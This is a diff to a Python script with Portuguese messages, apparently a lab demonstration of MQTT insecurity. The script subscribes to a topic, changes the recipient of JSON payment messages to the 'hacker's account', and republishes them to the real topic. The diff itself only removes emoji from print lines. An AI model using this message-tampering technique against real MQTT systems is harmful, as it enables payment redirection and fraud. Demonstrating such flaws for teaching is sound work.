@@ -15,9 +15,9 @@ print("Interceptando tópico: " + TOPIC_ORIGINAL)
 print(f"Client ID: {client_id}\n")
 
 def on_connect(client, userdata, flags, rc, properties=None):
-    print(f"✅ Conectado ao broker!")
+    print(f"Conectado ao broker!")
     client.subscribe(TOPIC_ORIGINAL)
-    print(f"📡 Inscrito no tópico: {TOPIC_ORIGINAL}\n")
+    print(f"Inscrito no tópico: {TOPIC_ORIGINAL}\n")
 
 def on_message(client, userdata, message):
     payload = message.payload.decode()
@@ -31,13 +31,13 @@ def on_message(client, userdata, message):
     
     dados['para'] = "🏴‍☠️ Conta do Hacker"
     
-    print(f"\n   ⚠️  INTEGRIDADE QUEBRADA:")
+    print(f"\n   INTEGRIDADE QUEBRADA:")
     print(f"      Destino alterado para: {dados['para']}")
     print(f"      Valor roubado: R$ {dados['valor']}")
     
     mensagem_modificada = json.dumps(dados)
     client.publish(TOPIC_REAL, mensagem_modificada)
-    print(f"   ✅ Mensagem modificada enviada!\n")
+    print(f"   Mensagem modificada enviada!\n")
     print("=" * 50 + "\n")
 
 client = mqtt.Client(
